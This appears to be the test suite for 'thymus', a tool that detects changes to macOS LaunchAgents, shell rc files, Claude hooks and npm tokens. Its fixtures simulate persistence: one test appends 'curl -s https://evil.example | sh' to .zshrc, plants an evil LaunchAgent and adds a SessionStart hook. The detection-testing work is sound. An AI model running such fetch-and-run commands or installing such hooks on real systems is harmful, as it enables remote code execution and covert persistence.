import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync, appendFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const BIN = join(dirname(fileURLToPath(import.meta.url)), '..', 'bin', 'thymus');
const TOKEN = 'npm_s3cr3tT0kenValue1234567890abcdefXYZ';

function plist(label: string, program: string) {
  return `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0"><dict><key>Label</key><string>${label}</string><key>ProgramArguments</key><array><string>${program}</string></array></dict></plist>\n`;
}

function put(home: string, rel: string, text: string) {
  mkdirSync(dirname(join(home, rel)), { recursive: true });
  writeFileSync(join(home, rel), text);
}

function fakeHome() {
  const home = mkdtempSync(join(tmpdir(), 'thymus-'));
  put(home, '.zshrc', 'export PATH=$HOME/bin:$PATH\n');
  put(home, 'Library/LaunchAgents/com.example.ok.plist', plist('com.example.ok', '/usr/bin/true'));
  put(home, '.claude/settings.json', JSON.stringify({ hooks: {} }));
  put(home, '.npmrc', `registry=https://registry.npmjs.org/\n//registry.npmjs.org/:_authToken=${TOKEN}\n`);
  const cli = (...args: string[]) => {
    const r = spawnSync(process.execPath, [BIN, ...args], { env: { ...process.env, HOME: home, THYMUS_HOME: join(home, '.thymus') }, encoding: 'utf8' });
    return { code: r.status, out: r.stdout + r.stderr };
  };
  assert.equal(cli('init').code, 0);
  return { home, cli };
}

test('init then diff is clean', () => {
  const { cli } = fakeHome();
  const r = cli('diff');
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, /0 new, 0 changed, 0 removed/);
});

test('new LaunchAgent, edited .zshrc and new Claude hook show up', () => {
  const { home, cli } = fakeHome();
  put(home, 'Library/LaunchAgents/com.evil.agent.plist', plist('com.evil.agent', '/tmp/evil.sh'));
  appendFileSync(join(home, '.zshrc'), 'curl -s https://evil.example | sh\n');
  put(home, '.claude/settings.json', JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'node .claude/setup.mjs' }] }] } }));
  const r = cli('diff');
  assert.equal(r.code, 1, r.out);
  assert.match(r.out, /\+ launchagents:user\/com\.evil\.agent {2}\/tmp\/evil\.sh/);
  assert.match(r.out, /~ shellrc:~\/\.zshrc/);
  assert.match(r.out, /\+ claude:settings\.json:hook\/SessionStart\/\*\/node \.claude\/setup\.mjs/);
  const json = JSON.parse(cli('diff', '--json').out);
  assert.equal(json.changes.length, 3);
});

test('approve by id clears one item, --all clears the rest', () => {
  const { home, cli } = fakeHome();
  put(home, 'Library/LaunchAgents/com.evil.agent.plist', plist('com.evil.agent', '/tmp/evil.sh'));
  appendFileSync(join(home, '.zshrc'), 'alias ll="ls -l"\n');
  assert.equal(cli('approve', 'launchagents:user/com.evil.agent').code, 0);
  const r = cli('diff');
  assert.doesNotMatch(r.out, /com\.evil\.agent/);
  assert.match(r.out, /\.zshrc/);
  assert.equal(cli('approve', 'nope:missing').code, 1);
  assert.equal(cli('approve', '--all').code, 0);
  assert.equal(cli('diff').code, 0);
});

test('removed items are listed but do not fail the run', () => {
  const { home, cli } = fakeHome();
  put(home, '.zshrc', '');
  spawnSync('rm', [join(home, 'Library/LaunchAgents/com.example.ok.plist')]);
  const r = cli('diff');
  assert.equal(r.code, 1, 'zshrc changed');
  assert.match(r.out, /- launchagents:user\/com\.example\.ok/);
});

test('known.json pre-approves matching items', () => {
  const { home, cli } = fakeHome();
  writeFileSync(join(home, '.thymus/known.json'), JSON.stringify([{ receptor: 'launchagents', id: '*/com.docker.*', label: '*docker*' }]));
  put(home, 'Library/LaunchAgents/com.docker.helper.plist', plist('com.docker.helper', '/Applications/Docker.app/helper'));
  assert.equal(cli('diff').code, 0);
  put(home, 'Library/LaunchAgents/com.docker.evil.plist', plist('com.docker.evil', '/tmp/payload'));
  assert.match(cli('diff').out, /com\.docker\.evil/);
});

test('a broken receptor is reported and does not stop the run', () => {
  const { home, cli } = fakeHome();
  put(home, '.thymus/receptors/broken.sh', '#!/bin/sh\necho "not json"\n');
  put(home, '.thymus/receptors/crash.sh', '#!/bin/sh\necho boom >&2\nexit 3\n');
  chmodSync(join(home, '.thymus/receptors/broken.sh'), 0o755);
  chmodSync(join(home, '.thymus/receptors/crash.sh'), 0o755);
  const r = cli('diff');
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, /receptor broken failed/);
  assert.match(r.out, /receptor crash failed: boom/);
  const rs = cli('receptors');
  assert.match(rs.out, /crash +ERROR boom/);
  assert.match(rs.out, /launchagents +\d+ items/);
});

test('user receptor in bash is picked up', () => {
  const { home, cli } = fakeHome();
  put(home, '.thymus/receptors/hello.sh', '#!/bin/sh\necho \'[{"id":"one","label":"hello","hash":"x"}]\'\n');
  chmodSync(join(home, '.thymus/receptors/hello.sh'), 0o755);
  assert.match(cli('diff').out, /\+ hello:one {2}hello/);
});

test('.npmrc token value never reaches self.json', () => {
  const { home } = fakeHome();
  const self = readFileSync(join(home, '.thymus/self.json'), 'utf8');
  assert.ok(self.includes("_authToken"));
  assert.ok(!self.includes(TOKEN));
  assert.ok(!self.includes('s3cr3t'));
});
